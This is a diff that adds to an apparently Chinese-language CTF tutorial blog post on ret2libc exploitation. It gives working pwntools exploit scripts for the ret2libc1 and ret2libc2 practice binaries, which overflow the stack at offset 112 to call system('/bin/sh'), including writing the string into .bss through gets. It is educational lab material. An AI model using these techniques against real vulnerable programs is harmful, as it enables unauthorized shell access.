@@ -489,3 +489,116 @@ system@plt = 0×08048460
 
 ![gadget](../images/2018-11-17-Ret2libc/ret2libc1-ropgadget-binsh.png)
 
+4、动态调试程序查看偏移
+
+方法如上例，通过覆盖返回地址使程序在函数返回时跳转到无效地址引起调试器报错，偏移为：112
+
+5、编写 exp
+
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+
+sh = process('./ret2libc1')
+
+elf = ELF('ret2libc1')
+
+def pwn(sh, payload):
+	sh.recvuntil('\n')
+	sh.sendline(payload)
+	sh.interactive()
+
+#system_addr = 0x08048460
+system_addr = elf.plt['system']
+#binsh_addr = 0x08048720
+binsh_addr = elf.search('/bin/sh').next()
+ret_addr = 0xdeadbeef
+
+payload = 'a' * 112 + p32(system_addr) + p32(ret_addr) + p32(binsh_addr)
+pwn(sh, payload)
+```
+
+![getshell](../images/2018-11-17-Ret2libc/ret2libc1-getshell.png)
+
+### 0×02 ret2libc2
+
+与 ret2libc1 不同的是程序中不包含 “/bin/sh” 字符串，需要自己将字符串写入到内存中。所以整个过程分成了两部分，第一部分是将 “/bin/sh” 读入到内存中；第二部分是执行 system() 获取 shell。
+
+1、构造 payload
+
+第一部分：
+
+```bash
+‘a' * 112 + gets_plt + ret_addr + buf_addr
+```
+
+这里需要思考两点，第一点就是 buf 地址，我们的 “/bin/sh” 应该放在哪里，通常我们会选择 .bss (存储未初始化全局变量) 段，IDA 查看 .bss 段发现程序给出了 buf2[100]数组，正好就可以使用这块区域。
+
+![bss](../images/2018-11-17-Ret2libc/ret2libc2-bss.png)
+
+ 现在考虑返回地址，因为在 gets() 函数完成后需要调用 system() 函数需要保持堆栈平衡，所以在调用完 gets() 函数后提升堆栈，这就需要 add esp, 4 这样的指令但是程序中并没有这样的指令。更换思路，通过使用 pop xxx 指令也可以完成同样的功能，在程序中找到了 pop ebx，ret 指令。 
+
+![gadget](../images/2018-11-17-Ret2libc/ret2libc2-gadget.png)
+
+第二部分：
+
+这部分就与上一题一样，
+
+```bash
+system_plt + ret_addr + buf_addr
+```
+
+还有另外一种 payload 更简洁情况：
+
+在 gets() 函数调用完后，在返回地址处覆盖上 system() 的地址将 gets() 函数的参数 buf 地址当成返回地址，再在后面加上 system() 函数的参数 buf。
+
+```bash
+’a' * 112 + gets_plt + system_plt + buf_addr + buf_addr
+```
+
+ 2、编写 exp 
+
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+
+sh = process('./ret2libc2')
+
+elf = ELF('ret2libc2')
+
+def pwn(sh, payload):
+	sh.recvuntil('?')
+	sh.sendline(payload)
+	sh.sendline('/bin/sh')#这里将 /bin/sh 传入 buf 中
+	sh.interactive()
+
+buf = elf.symbols['buf2']
+gets_plt = elf.plt['gets']
+system_plt = elf.plt['system']
+pop_ebx_ret = 0x0804843d
+ret_addr = 0xdeadbeef
+
+#payload = 'a' * 112 + p32(gets_plt) + p32(pop_ebx_ret) + p32(buf) + p32(system_plt) + p32(ret_addr) + p32(buf)
+payload = 'a' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf) + p32(buf)
+pwn(sh, payload)
+```
+
+![getshell](../images/2018-11-17-Ret2libc/ret2libc2-getshell.png)
+
+<br/>
+
+## 0×08 总结
+
+本文主要介绍了一下动态链接的基本过程，GOT、PLT、延迟绑定等有关技术点，有了这些基础对理解 ret2libc 技术和后面继续深入的其他技术会有很大的帮助。
+
+<br/>
+
+## 0×09 参考
+
+> 《程序员的自我修养 —— 链接、装载与库》这本书很细致的讲解了操作系统是如何加载和运行程序，极力推荐
+>
+> [一步一步学rop蒸米](http://wooyun.jozxing.cc/search?keywords=一步一步学rop&content_search_by=by_drops)
+>
+> [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/)
